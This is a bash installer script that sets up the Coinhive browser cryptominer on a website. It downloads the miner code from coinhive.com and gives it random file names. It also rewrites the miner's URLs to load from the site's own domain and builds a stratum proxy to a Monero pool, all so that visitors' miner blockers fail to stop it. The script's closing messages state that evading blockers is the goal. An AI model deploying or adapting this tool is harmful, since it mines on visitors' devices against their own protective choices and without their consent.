npm install
echo Generating random file name...
minerblock=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
coinhive=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
cryptonight=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".wasm"
echo Downloading script...
wget -O $minerblock https://rawgit.com/SkyrisBactera/AntiMinerblock/master/minerblock.js >/dev/null 2>/dev/null
wget -O $coinhive https://coinhive.com/lib/coinhive.min.js >/dev/null 2>/dev/null
wget -O $cryptonight https://coinhive.com/lib/cryptonight.wasm >/dev/null 2>/dev/null
echo "What is your Coinhive site key? (required)"
read cHiveKey
echo "What is your Crypto-loot site key? (optional)"
read cLootKey
echo "What is your CLOUDCOINS site key? (optional)"
read cCoinsKey
echo "Substituting the keys and filenames into $minerblock..."
sed -i 's/cHive/'$cHiveKey'/g' $minerblock
sed -i 's/cLoot/'$cLootKey'/g' $minerblock
sed -i 's/cCoins/'$cCoinsKey'/g' $minerblock
sed -i 's/locCoin/'$coinhive'/g' $minerblock
echo "Do you want to enable proxy functionality? This is very recommended, however, your computer/server would have to host it (y/n)"
read proxyYes
declare -l proxyYes
proxyYes=$proxyYes
clear
if [ "$proxyYes" == "y" ]; then
  echo "Do you want to use HTTPS? (y/n) (required)"
  read httpsYes
  echo "What is your Monero wallet address? (required)"
  read walletId
  echo "Do you have a domain name? (y/n) (required)"
  read domainYes
  declare -l domainYes
  domainYes=$domainYes
  if [ "$domainYes" == "y" ]; then
    echo "What is your domain name? (required)"
    read domainName
  else
    domainName=$(dig +short myip.opendns.com @resolver1.opendns.com)
  fi
    echo "What is the URL for this directory? (required) In this exact format: https://fish.com/public/"
    read directory
    echo Substituting the proxy into $minerblock...
    port=$(shuf -i 2000-65000 -n 1)
    # This was such a pain in the a**
    sed -i 's~//strSub~''CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://'$domainName':'$port'"]];''~g' $minerblock
    sed -i 's~"https://coinhive.com/lib/"~new URL("'$directory'").href~g' $coinhive
    sed -i 's~\\"https:\\\/\\\/coinhive.com\\\/lib\\\/\\"~new URL(\\"'$directory'\\").href~g' $coinhive
    sed -i 's/cryptonight.wasm/'$cryptonight'/g' $coinhive
    declare -l httpsYes
    httpsYes=$httpsYes
    if [ "$httpsYes" == "y" ]; then
      clear
      echo What is your email?
      read email
      echo "Where is your key? (Ex: \"server.key\")"
      read key
      echo "Where is your certificate? (Ex: \"server.crt\")"
      read server
      sed -i 's/http:/https:/g' $coinhive
      sed -i 's/ws:/wss:/g' $minerblock
      echo Generating proxy.sh...
      echo "const createProxy = require(\"coin-hive-stratum\");" > proxy.js
      echo "const proxy = createProxy({host: \"pool.supportxmr.com\", port: 3333, login: '$walletId'}); ">> proxy.js
      echo "const fs = require(\"fs\");" >> proxy.js
      echo 'const server = require("https").createServer({key: fs.readFileSync("'$key'"), cert: fs.readFileSync("'$server'")}).listen('$port');' >> proxy.js
      echo "proxy.listen({server: server});" >> proxy.js
      echo "node proxy.js" > proxy.sh
    else
      echo "coin-hive-stratum "$port" --host=pool.supportxmr.com --port=3333 --login="$walletId > proxy.sh
    fi
    clear
    echo You need to run proxy.sh along with whatever server software you are using as long as you want Coinhive to work
    echo Make sure to open port $port, otherwise your users may be able to bypass this
fi
  echo You need to put the following into your HTML files that you want to have protection against Minerblockers:
  echo '<script src="'$minerblock'"></script>'
